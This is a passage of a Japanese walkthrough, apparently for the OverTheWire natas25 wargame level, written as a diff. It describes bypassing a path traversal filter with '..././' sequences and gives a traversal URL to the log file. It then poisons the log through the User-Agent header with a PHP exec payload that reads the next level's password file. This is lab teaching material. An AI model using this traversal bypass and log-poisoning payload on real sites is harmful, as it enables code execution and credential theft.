@@ -100,3 +100,26 @@ safeinclude()関数でファイル指定の悪意のある入力の無害化を�
 listFiles()関数で指定されたディレクトリのファイルリストを配列で返している。  
 logRequest()関数で年月日、User-Agent、session_id、message（引数）で`/var/www/natas/natas25/logs`ディレクトリにログをとっている。  
 
+safeinclude()関数でパストラバーサル攻撃の防御を行っているコードがあるが、  
+`....//`や`..././`などで回避できる。  
+
+
+以下で自分のログファイルを見られる。  
+`http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_<session_id>.log`  
+
+
+次に行うのは`if(strstr($filename,"natas_webpass")){`の箇所の回避だが、  
+パストラ攻撃で指定したファイルが見られる & ログファイルにUser-Agentを格納している & include()で読み出している ので、  
+User-Agentにphpコードを仕込むことができる。  
+
+
+以下のように行う。  
+![](img/natas25-2.png)  
+
+User-Agentに`<?php echo exec("cat /etc/natas_webpass/natas26"); ?>`を指定している。  
+
+再度、ログファイルを見てみると...  
+![](img/natas25-3.png)  
+
+
+クリア
